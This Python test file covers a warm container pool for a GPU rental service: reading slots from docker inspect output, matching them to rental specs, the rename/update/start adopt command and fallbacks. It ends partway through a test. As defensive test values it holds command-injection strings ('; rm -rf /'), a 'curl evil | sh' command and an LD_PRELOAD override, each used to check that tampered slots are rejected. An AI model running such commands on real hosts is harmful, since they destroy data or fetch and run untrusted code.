"""Warm container pool (WARM_POOL_ENABLED, default off) — see speed/WARM_POOL.md in the loop docs.

Off: the rent path never looks for a slot and creates its volume and container as before.
On: a whole-host rental of an image with a fresh slot adopts it (one lookup command, one
rename → update → start command), skipping volume creation and `docker run`; the slot must
equal, field for field, the container the rental would create now; any difference, a failed
adopt command, or a rental shape a slot cannot serve falls back to the path that exists today.
After a filler start the validator leaves one slot per image the executor keeps pre-pulled.
"""

import asyncio
import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from unittest.mock import AsyncMock, Mock

import pytest
import services.docker_service as ds_module
from payload_models.payloads import (
    BootstrapRestoreSpec,
    ContainerCreated,
    CustomOptions,
    ExternalVolumeInfo,
    FailedContainerRequest,
    PayloadPortMapping,
    ProfilerStepName,
    WorkloadKind,
)
from services.docker_service import DockerService
from services.rental_docker_sdk import RENTAL_NETWORK_NAME, build_gpu_docker_config

from services import warm_pool
from tests.test_deploy_optimizations import (
    _executor_info,
    _patch_happy,
    _payload,
    _run,
    _ssh_client,
    _ssh_result,
)

FIXTURES = Path(__file__).parent / "fixtures"
# Relative to the wall clock, not a literal: the service reads `datetime.now(UTC)` when it judges a
# slot's age, so a slot labelled `NOW - 1h` must stay inside MAX_AGE on any day the suite runs.
NOW = datetime.now(UTC).replace(microsecond=0)
MAX_AGE = timedelta(hours=24)
IMAGE = "daturaai/pytorch:1.0.0"
IMAGE_ID = "sha256:" + "11" * 32
SLOT_ID = "0f0f0f0f-0000-4000-8000-000000000001"


@pytest.fixture
def svc():
    return DockerService(ssh_service=Mock(), redis_service=Mock(), attestation_service=Mock())


def _image_doc(**over) -> dict:
    doc = {
        "Id": IMAGE_ID,
        "Config": {
            "Env": ["PATH=/usr/bin", "LANG=C.UTF-8", "NVIDIA_DRIVER_CAPABILITIES=compute,utility"],
            "Cmd": ["/start.sh"],
            "Entrypoint": ["/pytorch-entrypoint.sh"],
            "Labels": {"lium.volume_encryption.enable": "1"},
        },
    }
    doc.update(over)
    return doc


def _slot_doc(spec, image_doc: dict, *, labels: dict | None = None, **over) -> dict:
    """The `docker inspect` document dockerd writes for a container created from `spec`."""
    volume = spec.volumes[0]
    doc = {
        "Name": f"/{spec.name}",
        "Image": image_doc["Id"],
        "State": {"Status": "created", "StartedAt": "0001-01-01T00:00:00Z"},
        "Config": {
            "Image": spec.image,
            "Env": list(image_doc["Config"]["Env"])
            + [f"{k}={v}" for k, v in spec.environment.items()],
            "Cmd": image_doc["Config"]["Cmd"],
            "Entrypoint": image_doc["Config"]["Entrypoint"],
            "Labels": labels
            if labels is not None
            else warm_pool.slot_labels(
                volume_limit_gb=40, storage_limit_gb=20, now=NOW - timedelta(hours=1)
            ),
        },
        "Mounts": [
            {
                "Type": "volume",
                "Name": volume.source,
                "Destination": volume.target,
                "Driver": "vloopback:latest",
            }
        ],
        "HostConfig": {
            "Binds": [f"{volume.source}:{volume.target}:rw"],
            "PortBindings": {
                f"{p.container_port}/{p.protocol}": [{"HostIp": "", "HostPort": str(p.host_port)}]
                for p in spec.ports
            },
            "Devices": [
                {
                    "PathOnHost": d.path_on_host,
                    "PathInContainer": d.path_in_container or d.path_on_host,
                    "CgroupPermissions": d.permissions,
                }
                for d in spec.devices
            ],
            "DeviceRequests": [
                {
                    "Driver": "",
                    "Count": 0 if r.device_ids else r.count,
                    "DeviceIDs": list(r.device_ids) or None,
                    "Capabilities": [list(g) for g in r.capabilities],
                    "Options": {},
                }
                for r in spec.device_requests
            ],
            "Runtime": spec.runtime or "runc",
            "NetworkMode": spec.network or "default",
            "CapAdd": list(spec.cap_add),
            "Sysctls": dict(spec.sysctls),
            "Ulimits": [{"Name": u.name, "Soft": u.soft, "Hard": u.hard} for u in spec.ulimits],
            "RestartPolicy": {"Name": spec.restart_policy, "MaximumRetryCount": 0},
            "StorageOpt": {"size": f"{spec.storage_limit_gb}g"} if spec.storage_limit_gb else None,
            "NanoCpus": 0,
            "Memory": 0,
        },
    }
    for key, value in over.items():
        doc[key] = value
    return doc


def _spec(svc, payload, *, local_volume=f"volume_{SLOT_ID}", storage_limit_gb=20, port_maps=None):
    return svc._build_rental_container_run_spec(
        payload=payload,
        container_name=warm_pool.slot_name(SLOT_ID),
        custom_options=CustomOptions(),
        port_maps=port_maps or [(22, 20001, 20001)],
        local_volume=local_volume,
        local_volume_path="/root",
        encrypted_local_volume=False,
        external_volume_name=None,
        gpu_devices=build_gpu_docker_config(["GPU-test"]),
        effective_storage_limit_gb=storage_limit_gb,
        cpu_count=None,
    )


def _adoptable_payload(**over):
    base = dict(
        docker_image=IMAGE,
        disk_share=1.0,
        volume_limit_gb=40,
        storage_limit_gb=20,
        cpu_count=4,
        memory_gb=16,
    )
    base.update(over)
    return _payload(**base)


# ------------------------------------------------------------------
# what a rental must look like to adopt anything
# ------------------------------------------------------------------


def test_whole_host_plain_rental_may_adopt():
    assert (
        warm_pool.adopt_block_reason(
            _adoptable_payload(),
            CustomOptions(),
            is_custom_build=False,
            image_managed_jupyter=False,
        )
        is None
    )


@pytest.mark.parametrize(
    "payload_over, options, custom_build, jupyter, expected",
    [
        (
            {"workload_kind": WorkloadKind.FILLER},
            CustomOptions(),
            False,
            False,
            "not a customer rental",
        ),
        ({}, CustomOptions(), True, False, "custom build"),
        ({"local_volume": "volume_old"}, CustomOptions(), False, False, "reboot reuses its volume"),
        (
            {"pod_mapping": [PayloadPortMapping(internal_port=20001, external_port=20001)]},
            CustomOptions(),
            False,
            False,
            "reboot reuses its ports",
        ),
        (
            {
                "bootstrap_restore": BootstrapRestoreSpec(
                    restore_log_id="rl-1",
                    backup_engine="restic",
                    repository_pod_id="pod-old",
                    backup_volume_info=ExternalVolumeInfo(
                        name="backups", plugin="s3", iam_user_access_key="k", iam_user_secret_key="s"
                    ),
                    auth_token="t",
                    restore_path="/root",
                )
            },
            CustomOptions(),
            False,
            False,
            "restore writes the volume before create",
        ),
        (
            {"cluster_membership": None, "disk_share": 0.5},
            CustomOptions(),
            False,
            False,
            "partial-host rental",
        ),
        ({"disk_share": None}, CustomOptions(), False, False, "partial-host rental"),
        (
            {"storage_limit_gb": None},
            CustomOptions(),
            False,
            False,
            "storage-opt unsupported on this host",
        ),
        ({"enable_jupyter": True}, CustomOptions(), False, False, "jupyter port"),
        (
            {},
            CustomOptions(startup_commands="python train.py"),
            False,
            False,
            "startup_commands override",
        ),
        ({}, CustomOptions(entrypoint="/bin/sh"), False, False, "entrypoint override"),
        (
            {},
            CustomOptions(environment={"HF_TOKEN": "x"}),
            False,
            False,
            "renter environment is create-time",
        ),
        ({}, CustomOptions(volumes=["/workspace"]), False, False, "non-default volume path"),
        ({}, CustomOptions(shm_size="8g"), False, False, "shm_size override"),
        (
            {},
            CustomOptions(internal_ports=[22, 8000]),
            False,
            False,
            "template publishes its own ports",
        ),
        ({}, CustomOptions(initial_port_count=3), False, False, "template publishes its own ports"),
        ({}, CustomOptions(), False, True, "image-managed jupyter needs a create-time token"),
    ],
)
def test_rentals_a_slot_cannot_serve_are_blocked(
    payload_over, options, custom_build, jupyter, expected
):
    payload = _adoptable_payload(**payload_over)
    assert (
        warm_pool.adopt_block_reason(
            payload, options, is_custom_build=custom_build, image_managed_jupyter=jupyter
        )
        == expected
    )


# ------------------------------------------------------------------
# reading the host
# ------------------------------------------------------------------


def test_find_output_parses_image_and_slots():
    image = _image_doc()
    stdout = (
        json.dumps(image)
        + "\n__LIUM_WARM_POOL__\n"
        + json.dumps([{"Name": "/warm_a"}, {"Name": "/warm_b"}])
        + "\n"
    )
    found = warm_pool.parse_find_slots_output(stdout)
    assert found.image_doc == image
    assert [s["Name"] for s in found.slot_docs] == ["/warm_a", "/warm_b"]


def test_find_output_without_image_or_slots():
    none_listed = warm_pool.FindSlotsOutput(image_doc=None, slot_docs=[])
    assert warm_pool.parse_find_slots_output("__LIUM_WARM_POOL__\n") == none_listed
    assert (
        warm_pool.parse_find_slots_output("Error: No such image\n__LIUM_WARM_POOL__\n") == none_listed
    )


def test_find_output_that_cannot_be_read_is_not_an_empty_pool():
    """A slot section the byte cap cut (or that is not JSON) is None, never []: reading it as
    "no slots" would add a slot per filler start on a host with too many slot documents."""
    image = _image_doc()
    whole = json.dumps([{"Name": "/warm_a"}] * 40)
    cut = json.dumps(image) + "\n__LIUM_WARM_POOL__\n" + whole[: len(whole) // 2]
    unreadable = warm_pool.FindSlotsOutput(image_doc=image, slot_docs=None)
    assert warm_pool.parse_find_slots_output(cut) == unreadable
    assert (
        warm_pool.parse_find_slots_output(json.dumps(image) + "\n__LIUM_WARM_POOL__\nError: something\n")
        == unreadable
    )
    assert warm_pool.parse_find_slots_output("garbage with no separator") == warm_pool.FindSlotsOutput(
        image_doc=None, slot_docs=None
    )


def test_find_command_quotes_the_image_and_filters_created_slots():
    cmd = warm_pool.find_slots_command("daturaai/pytorch:1.0.0; rm -rf /")
    assert "'daturaai/pytorch:1.0.0; rm -rf /'" in cmd
    assert "--filter label=lium.warm_pool=1 --filter status=created" in cmd


def test_fresh_slot_of_the_image_is_read(svc):
    spec = _spec(svc, _adoptable_payload())
    slot = warm_pool.slot_from_inspect(
        _slot_doc(spec, _image_doc()), image_id=IMAGE_ID, now=NOW, max_age=MAX_AGE
    )
    assert slot is not None
    assert (slot.name, slot.volume_name, slot.volume_limit_gb, slot.storage_limit_gb) == (
        warm_pool.slot_name(SLOT_ID),
        f"volume_{SLOT_ID}",
        40,
        20,
    )


@pytest.mark.parametrize(
    "mutate",
    [
        lambda d: d.__setitem__("State", {"Status": "exited", "StartedAt": "2026-09-09T02:00:00Z"}),
        lambda d: d.__setitem__(
            "State", {"Status": "created", "StartedAt": "2026-09-09T02:00:00Z"}
        ),
        lambda d: d.__setitem__("Image", "sha256:" + "22" * 32),
        lambda d: d.__setitem__("Name", "/pod_not_a_slot"),
        lambda d: d["Config"]["Labels"].pop("lium.warm_pool"),
        lambda d: d["Config"]["Labels"].__setitem__(
            "lium.warm_pool.created_at", (NOW - timedelta(hours=25)).isoformat()
        ),
        lambda d: d["Config"]["Labels"].pop("lium.warm_pool.created_at"),
        lambda d: d.__setitem__("Mounts", []),
        lambda d: d["Mounts"].append(
            {
                "Type": "volume",
                "Name": "volume_other",
                "Destination": "/mnt",
                "Driver": "vloopback:latest",
            }
        ),
    ],
    ids=[
        "ever-started",
        "started-at-set",
        "other-image",
        "not-a-slot-name",
        "no-label",
        "too-old",
        "no-age",
        "no-volume",
        "two-volumes",
    ],
)
def test_containers_that_are_not_fresh_slots_are_ignored(svc, mutate):
    doc = _slot_doc(_spec(svc, _adoptable_payload()), _image_doc())
    mutate(doc)
    assert warm_pool.slot_from_inspect(doc, image_id=IMAGE_ID, now=NOW, max_age=MAX_AGE) is None


def test_slot_ports_map_through_the_backends_offer(svc):
    spec = _spec(svc, _adoptable_payload(), port_maps=[(22, 20001, 30001), (20000, 20002, 30002)])
    slot = warm_pool.slot_from_inspect(
        _slot_doc(spec, _image_doc()), image_id=IMAGE_ID, now=NOW, max_age=MAX_AGE
    )
    offered = [
        PayloadPortMapping(internal_port=20001, external_port=30001),
        PayloadPortMapping(internal_port=20002, external_port=30002),
        PayloadPortMapping(internal_port=20003, external_port=30003),
    ]
    rental = [(22, 20001, 30001), (20000, 20002, 30002)]
    assert warm_pool.slot_port_maps(slot, offered, rental) == rental
    # a bound host port the backend did not offer this rental → no adoption
    assert warm_pool.slot_port_maps(slot, offered[1:], rental) is None
    assert warm_pool.slot_port_maps(slot, None, rental) is None
    # the rental's own port set (generate_portMappings) must be the slot's, port for port
    assert warm_pool.slot_port_maps(slot, offered, [(22, 20001, 30001)]) is None
    assert warm_pool.slot_port_maps(slot, offered, rental + [(8000, 20003, 30003)]) is None


def test_slot_disk_sizes_must_sit_between_the_rentals_sizing_and_the_request_cap(svc):
    """The slot is labelled volume 40 / storage 20. Ceiling: the backend's request cap. Floor: what
    `resolve_volume_sizing` gives this rental on the host as it is now — a slot sized while a
    filler's data held the disk is smaller than that and must not be adopted whole."""
    slot = warm_pool.slot_from_inspect(
        _slot_doc(_spec(svc, _adoptable_payload()), _image_doc()),
        image_id=IMAGE_ID,
        now=NOW,
        max_age=MAX_AGE,
    )

    def fit(payload, *, sized_volume_gb, sized_storage_gb):
        return warm_pool.slot_disk_sizes_fit(
            slot, payload, sized_volume_gb=sized_volume_gb, sized_storage_gb=sized_storage_gb
        )

    assert fit(_adoptable_payload(volume_limit_gb=40), sized_volume_gb=38, sized_storage_gb=19) is None
    assert fit(_adoptable_payload(volume_limit_gb=40), sized_volume_gb=40, sized_storage_gb=20) is None
    # a passthrough sizing (legacy contract) carries no numbers: only the cap applies
    assert fit(_adoptable_payload(volume_limit_gb=None), sized_volume_gb=None, sized_storage_gb=None) is None
    assert (
        fit(_adoptable_payload(volume_limit_gb=20), sized_volume_gb=20, sized_storage_gb=10)
        == "slot volume larger than the request cap"
    )
    assert (
        fit(_adoptable_payload(volume_limit_gb=40), sized_volume_gb=41, sized_storage_gb=20)
        == "slot volume smaller than the rental's sizing"
    )
    assert (
        fit(_adoptable_payload(volume_limit_gb=40), sized_volume_gb=40, sized_storage_gb=21)
        == "slot storage-opt smaller than the rental's sizing"
    )


# ------------------------------------------------------------------
# the slot must be the container the rental would create now
# ------------------------------------------------------------------


def test_slot_equal_to_the_rental_spec_matches(svc):
    spec = _spec(svc, _adoptable_payload())
    image = _image_doc()
    slot = warm_pool.slot_from_inspect(
        _slot_doc(spec, image), image_id=IMAGE_ID, now=NOW, max_age=MAX_AGE
    )
    assert warm_pool.slot_matches(slot, spec, image) is None


def test_image_volume_lines_are_anonymous_mounts_on_slot_and_rental_alike(svc):
    """An image `VOLUME /data` gives every container of the image an anonymous local volume at
    /data — dockerd adds it to the slot and would add it to a fresh rental, so it is expected."""
    spec = _spec(svc, _adoptable_payload())
    image = _image_doc(Config={**_image_doc()["Config"], "Volumes": {"/data": {}}})
    doc = _slot_doc(spec, image)
    slot = warm_pool.slot_from_inspect(doc, image_id=IMAGE_ID, now=NOW, max_age=MAX_AGE)
    # created before the image carried the VOLUME line (or the anonymous volume was removed)
    assert warm_pool.slot_matches(slot, spec, image) == "mounts"
    doc["Mounts"].append(
        {"Type": "volume", "Name": "a" * 64, "Destination": "/data", "Driver": "local", "RW": True}
    )
    slot = warm_pool.slot_from_inspect(doc, image_id=IMAGE_ID, now=NOW, max_age=MAX_AGE)
    assert slot is not None and slot.volume_name == f"volume_{SLOT_ID}"
    assert warm_pool.slot_matches(slot, spec, image) is None
    # a mount the image does not declare is still a miss
    doc["Mounts"].append(
        {"Type": "volume", "Name": "b" * 64, "Destination": "/etc", "Driver": "local", "RW": True}
    )
    slot = warm_pool.slot_from_inspect(doc, image_id=IMAGE_ID, now=NOW, max_age=MAX_AGE)
    assert warm_pool.slot_matches(slot, spec, image) == "mounts"


@pytest.mark.parametrize(
    "mutate, expected",
    [
        (lambda d: d["HostConfig"].__setitem__("Binds", ["volume_x:/root:rw"]), "binds"),
        (
            lambda d: d["HostConfig"]["PortBindings"].__setitem__(
                "8888/tcp", [{"HostIp": "", "HostPort": "20009"}]
            ),
            "ports",
        ),
        (lambda d: d["HostConfig"].__setitem__("Devices", []), "devices"),
        (
            lambda d: d["HostConfig"]["DeviceRequests"][0].__setitem__("DeviceIDs", ["GPU-other"]),
            "gpu device requests",
        ),
        (lambda d: d["HostConfig"].__setitem__("Runtime", "sysbox-runc"), "runtime"),
        (lambda d: d["HostConfig"].__setitem__("CapAdd", ["SYS_ADMIN"]), "capabilities"),
        (lambda d: d["HostConfig"].__setitem__("Sysctls", {}), "sysctls"),
        (
            lambda d: d["HostConfig"].__setitem__(
                "Ulimits", [{"Name": "nofile", "Soft": 1, "Hard": 1}]
            ),
            "ulimits",
        ),
        (lambda d: d["HostConfig"].__setitem__("RestartPolicy", {"Name": "no"}), "restart policy"),
        (lambda d: d["HostConfig"].__setitem__("StorageOpt", {"size": "99g"}), "storage-opt"),
        (
            lambda d: d["HostConfig"].__setitem__("Memory", 1 << 30),
            "slot carries cpu/memory limits",
        ),
        (lambda d: d["Config"]["Env"].append("LD_PRELOAD=/evil.so"), "environment"),
        (
            lambda d: d["Config"].__setitem__(
                "Env",
                [e for e in d["Config"]["Env"] if not e.startswith("NVIDIA_DRIVER_CAPABILITIES=")]
                + ["NVIDIA_DRIVER_CAPABILITIES=compute,utility"],
            ),
            "environment",
        ),
        (lambda d: d["HostConfig"].__setitem__("ShmSize", 8 << 30), "shm_size"),
        (lambda d: d["Config"].__setitem__("Cmd", ["/bin/sh", "-c", "curl evil | sh"]), "command"),
        (lambda d: d["Config"].__setitem__("Entrypoint", ["/evil"]), "entrypoint"),
        (lambda d: d["Config"].__setitem__("Image", "daturaai/pytorch:other"), "image reference"),
    ],
    ids=lambda v: v if isinstance(v, str) else "",
)
def test_any_difference_from_the_rental_spec_is_a_miss(svc, mutate, expected):
    spec = _spec(svc, _adoptable_payload())
    image = _image_doc()
    doc = _slot_doc(spec, image)
    mutate(doc)
    slot = warm_pool.slot_from_inspect(doc, image_id=IMAGE_ID, now=NOW, max_age=MAX_AGE)
    assert slot is not None
    assert warm_pool.slot_matches(slot, spec, image) == expected


def test_real_dockerd_inspect_documents_parse_and_match(svc):
    """The documents a real dockerd 27.3.1 wrote for slots created through docker-py with the
    validator's host_config kwargs (speed/proof/wp_ec2_inspect.py, run on pod 0a227dc4): the
    parser reads them, and the comparator names the fields that differ from a rental spec."""
    image = json.loads((FIXTURES / "warm_pool_image_inspect.json").read_text())
    plain = json.loads((FIXTURES / "warm_pool_slot_inspect.json").read_text())[0]
    gpu = json.loads((FIXTURES / "warm_pool_gpu_slot_inspect.json").read_text())[0]
    now = datetime(2026, 9, 9, 4, 0, tzinfo=UTC)
    # The pod's nested dockerd had no vloopback plugin, so the hand-built slots mount a `local`
    # volume; a real slot's volume comes from create_local_volume (vloopback). Everything else in
    # the documents is what dockerd wrote.
    for doc in (plain, gpu):
        doc["Mounts"][0]["Driver"] = "vloopback:latest"
        # the pod predates the ICC-off rental bridge (DAH-3199); a slot created today sits on it
        doc["HostConfig"]["NetworkMode"] = RENTAL_NETWORK_NAME

    slot = warm_pool.slot_from_inspect(plain, image_id=image["Id"], now=now, max_age=MAX_AGE)
    assert slot is not None
    assert (slot.name, slot.volume_name, slot.volume_limit_gb, slot.storage_limit_gb) == (
        "warm_slot1",
        "volume_slot1",
        40,
        20,
    )
    assert warm_pool.slot_port_maps(
        slot,
        [
            PayloadPortMapping(internal_port=20001, external_port=30001),
            PayloadPortMapping(internal_port=20002, external_port=30002),
        ],
        [(22, 20001, 30001), (20000, 20002, 30002)],
    ) == [(22, 20001, 30001), (20000, 20002, 30002)]

    gpu_slot = warm_pool.slot_from_inspect(gpu, image_id=image["Id"], now=now, max_age=MAX_AGE)
    spec = svc._build_rental_container_run_spec(
        payload=_adoptable_payload(docker_image="ubuntu:24.04", gpu_uuids=["GPU-aaaa"]),
        container_name="warm_gpu1",
        custom_options=CustomOptions(),
        port_maps=[(22, 20001, 30001), (20000, 20002, 30002)],
        local_volume="volume_gpu1",
        local_volume_path="/root",
        encrypted_local_volume=False,
        external_volume_name=None,
        gpu_devices=build_gpu_docker_config(["GPU-aaaa"]),
        effective_storage_limit_gb=None,
        cpu_count=None,
    )
    # the fixture slot carries a memlock ulimit and an explicit command a rental spec does not
    assert warm_pool.slot_matches(gpu_slot, spec, image) == "ulimits"
    gpu["HostConfig"]["Ulimits"] = None
    gpu_slot = warm_pool.slot_from_inspect(gpu, image_id=image["Id"], now=now, max_age=MAX_AGE)
    assert warm_pool.slot_matches(gpu_slot, spec, image) == "command"
    gpu["Config"]["Cmd"] = image["Config"]["Cmd"]
    gpu_slot = warm_pool.slot_from_inspect(gpu, image_id=image["Id"], now=now, max_age=MAX_AGE)
    assert warm_pool.slot_matches(gpu_slot, spec, image) is None


def test_adopt_command_renames_sizes_and_starts(svc):
    slot = warm_pool.slot_from_inspect(
        _slot_doc(_spec(svc, _adoptable_payload()), _image_doc()),
        image_id=IMAGE_ID,
        now=NOW,
        max_age=MAX_AGE,
    )
    cmd = warm_pool.adopt_command(slot, "pod_abc", cpu_count=4, memory_gb=16)
    assert cmd == (
        f"/usr/bin/docker rename {slot.name} pod_abc && "
        "/usr/bin/docker update --cpus 4 --memory 16g --memory-swap 32g pod_abc >/dev/null && "
        "/usr/bin/docker start pod_abc >/dev/null"
    )
    assert "docker update" not in warm_pool.adopt_command(
        slot, "pod_abc", cpu_count=None, memory_gb=None
    )


def test_stale_slots_from_listing():
    listing = (
        f"warm_a\t{(NOW - timedelta(hours=2)).isoformat()}\n"
        f"warm_b\t{(NOW - timedelta(hours=30)).isoformat()}\n"
        "warm_c\t\n"
        f"pod_x\t{(NOW - timedelta(hours=30)).isoformat()}\n"
    )
    assert warm_pool.stale_slots(listing, now=NOW, max_age=MAX_AGE) == ["warm_b", "warm_c"]


# ------------------------------------------------------------------
# the rent path, end to end with a fake host
# ------------------------------------------------------------------


VOLUME_INSPECT = "vloopback:latest|40g|true|42949672960\n"
NETWORK_INSPECT = "bridge|false\n"  # the ICC-off rental bridge (DAH-3199), as `docker network inspect` prints it


def _host(
    svc,
    spec,
    image,
    *,
    adopt_exit: int = 0,
    slot_doc: dict | None = None,
    volume_inspect: str = VOLUME_INSPECT,
    volume_inspect_exit: int = 0,
    network_inspect: str = NETWORK_INSPECT,
):
    """An ssh client whose host answers the warm-pool commands like a node with one slot."""
    ssh = _ssh_client(inspect_exit=0)
    doc = slot_doc if slot_doc is not None else _slot_doc(spec, image)

    def _side(cmd, *args, **kwargs):
        if "__LIUM_WARM_POOL__" in cmd:
            return _ssh_result(
                stdout=json.dumps(image) + "\n__LIUM_WARM_POOL__\n" + json.dumps([doc]) + "\n"
            )
        if "docker volume inspect" in cmd:
            return _ssh_result(exit_status=volume_inspect_exit, stdout=volume_inspect)
        if "docker network inspect" in cmd:
            return _ssh_result(stdout=network_inspect)
        if "docker rename" in cmd:
            return _ssh_result(exit_status=adopt_exit, stderr="boom" if adopt_exit else "")
        return _ssh_result(exit_status=0)

    ssh.run = AsyncMock(side_effect=_side)
    return ssh


def _cmds(ssh):
    return [c.args[0] for c in ssh.run.await_args_list if c.args]


@pytest.mark.asyncio
async def test_flag_off_never_looks_for_a_slot(svc, monkeypatch):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", False)
    payload = _adoptable_payload()
    ssh = _host(svc, _spec(svc, payload), _image_doc())
    _patch_happy(svc, monkeypatch, ssh)

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    # the flag gates the slot lookup, the adoption and the sizing's slot-volume listing: no warm-pool
    # command reaches the host
    assert not any(
        "__LIUM_WARM_POOL__" in c or "docker rename" in c or "lium.warm_pool" in c for c in _cmds(ssh)
    )
    svc.create_local_volume.assert_awaited_once()
    svc._run_rental_docker_create_with_port_retry.assert_awaited_once()
    assert result.volume_name == f"volume_{payload.pod_id}"


@pytest.mark.asyncio
async def test_flag_on_adopts_the_slot_instead_of_creating(svc, monkeypatch):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    payload = _adoptable_payload()
    spec = _spec(svc, payload)
    ssh = _host(svc, spec, _image_doc())
    _patch_happy(svc, monkeypatch, ssh)

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    # the rental's own sizing (volume 10 / storage 20 on this fake host) is the floor the slot
    # (40 / 20) is measured against; it is the one thing of the volume stage a hit still pays
    svc.resolve_volume_sizing.assert_awaited_once()
    svc.create_local_volume.assert_not_awaited()
    svc._run_rental_docker_create_with_port_retry.assert_not_awaited()
    adopt = [c for c in _cmds(ssh) if "docker rename" in c]
    assert adopt == [
        f"/usr/bin/docker rename {spec.name} pod_{payload.pod_id} && "
        f"/usr/bin/docker update --cpus 4 --memory 16g --memory-swap 32g pod_{payload.pod_id} >/dev/null && "
        f"/usr/bin/docker start pod_{payload.pod_id} >/dev/null"
    ]
    assert result.volume_name == f"volume_{SLOT_ID}"
    assert result.container_name == f"pod_{payload.pod_id}"
    assert result.port_maps == [(22, 20001)]
    assert (result.volume_limit_gb, result.storage_limit_gb) == (40, 20)
    assert any(p.name == ProfilerStepName.WARM_POOL_LOOKUP for p in result.profilers)
    # the slot's volume was read from the plugin before the rename, not taken from the label
    cmds = _cmds(ssh)
    assert cmds.index(warm_pool.inspect_volume_command(f"volume_{SLOT_ID}")) < cmds.index(adopt[0])
    # and the rental network was read as an ICC-off bridge before the start (DAH-3199)
    assert cmds.index(warm_pool.inspect_network_command(spec.network)) < cmds.index(adopt[0])
    # the renter's keys still land after the start, as on every rental
    assert any(
        "authorized_keys" in " ".join(s.argv)
        for s in svc.rental_docker_client_factory.client.exec_specs
    )


@pytest.mark.parametrize(
    "inspect_output, inspect_exit",
    [
        ("vloopback:latest|400g|true|\n", 0),
        ("vloopback:latest|40g|false|\n", 0),
        ("local|40g|true|\n", 0),
        ("", 0),
        ("", 1),
    ],
    ids=["size", "not-sparse", "driver", "no-output", "no-such-volume"],
)
@pytest.mark.asyncio
async def test_volume_that_differs_from_the_labels_is_removed_not_adopted(
    svc, monkeypatch, inspect_output, inspect_exit
):
    """The size labels are on a container the miner's daemon holds; the volume itself decides."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    payload = _adoptable_payload()
    spec = _spec(svc, payload)
    ssh = _host(
        svc, spec, _image_doc(), volume_inspect=inspect_output, volume_inspect_exit=inspect_exit
    )
    _patch_happy(svc, monkeypatch, ssh)

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    assert not any("docker rename" in c for c in _cmds(ssh))
    assert any(
        f"docker rm -f {spec.name}" in c and f"volume rm volume_{SLOT_ID}" in c for c in _cmds(ssh)
    )
    svc.create_local_volume.assert_awaited_once()
    assert result.volume_name == f"volume_{payload.pod_id}"
    assert (result.volume_limit_gb, result.storage_limit_gb) == (10, 20)


@pytest.mark.asyncio
async def test_slot_smaller_than_the_rentals_sizing_is_removed_and_the_sizing_is_reused(svc, monkeypatch):
    """A slot sized while a filler's data held the disk (volume 40) is smaller than what this rental's
    own sizing gives it now (50): the rental is created fresh, at the sizing the lookup already
    computed — no second sizing — and the slot goes rather than wait for a rental with a cap small
    enough to fit it; the next filler start leaves one sized for the host as it is."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    payload = _adoptable_payload(volume_limit_gb=60)
    spec = _spec(svc, payload)
    ssh = _host(svc, spec, _image_doc())
    _patch_happy(svc, monkeypatch, ssh)
    monkeypatch.setattr(
        svc, "resolve_volume_sizing", AsyncMock(return_value=Mock(volume_limit_gb=50, storage_limit_gb=25))
    )

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    cmds = _cmds(ssh)
    assert not any("docker rename" in c for c in cmds)
    assert any(f"docker rm -f {spec.name}" in c and f"volume rm volume_{SLOT_ID}" in c for c in cmds)
    svc.resolve_volume_sizing.assert_awaited_once()
    svc.create_local_volume.assert_awaited_once()
    assert svc.create_local_volume.await_args.kwargs["limit"] == 50
    assert result.volume_name == f"volume_{payload.pod_id}"
    assert (result.volume_limit_gb, result.storage_limit_gb) == (50, 25)
    # the lookup did the sizing, so its step carries that time and is not "skipped"
    lookup = next(p for p in result.profilers if p.name == ProfilerStepName.WARM_POOL_LOOKUP)
    assert lookup.skipped is False


@pytest.mark.asyncio
async def test_slot_larger_than_the_request_cap_is_kept_for_a_larger_rental(svc, monkeypatch):
    """The ceiling is this rental's own cap: a slot above it may fit the next rental, so it stays."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    payload = _adoptable_payload(volume_limit_gb=20)
    spec = _spec(svc, payload)
    ssh = _host(svc, spec, _image_doc())
    _patch_happy(svc, monkeypatch, ssh)

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    assert not any("docker rename" in c or "docker rm -f" in c for c in _cmds(ssh))
    svc.create_local_volume.assert_awaited_once()
    assert result.volume_name == f"volume_{payload.pod_id}"


def test_volume_mismatch_reads_the_plugin_record(svc):
    slot = warm_pool.slot_from_inspect(
        _slot_doc(_spec(svc, _adoptable_payload()), _image_doc()),
        image_id=IMAGE_ID,
        now=NOW,
        max_age=MAX_AGE,
    )
    assert warm_pool.volume_mismatch(slot, "vloopback:latest|40g|true|42949672960\n") is None
    assert warm_pool.volume_mismatch(slot, "vloopback|40G|true|\n") is None
    # the plugin's byte count stands in when the size option is missing
    assert warm_pool.volume_mismatch(slot, "vloopback:latest||true|42949672960\n") is None
    assert warm_pool.volume_mismatch(slot, "vloopback:latest|39g|true|\n") == "volume size"
    assert warm_pool.volume_mismatch(slot, "vloopback:latest||true|42949672961\n") == "volume size"
    assert warm_pool.volume_mismatch(slot, "vloopback:latest|40g||\n") == "volume not sparse"
    assert warm_pool.volume_mismatch(slot, "local|40g|true|\n") == "volume driver"
    assert warm_pool.volume_mismatch(slot, "a|40g|true|\nb|40g|true|\n") == "volume not inspectable"
    assert "'volume_x; rm -rf /'" in warm_pool.inspect_volume_command("volume_x; rm -rf /")


@pytest.mark.asyncio
async def test_slot_that_differs_falls_back_to_a_fresh_create(svc, monkeypatch):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    payload = _adoptable_payload()
    spec = _spec(svc, payload)
    image = _image_doc()
    doc = _slot_doc(spec, image)
    doc["Config"]["Env"].append("LD_PRELOAD=/evil.so")
    ssh = _host(svc, spec, image, slot_doc=doc)
    _patch_happy(svc, monkeypatch, ssh)

    result = await _run(svc, payload)

    assert isinstance(result, ContainerCreated)
    assert not any("docker rename" in c for c in _cmds(ssh))
    assert any(
        f"docker rm -f {spec.name}" in c and f"volume rm volume_{SLOT_ID}" in c for c in _cmds(ssh)
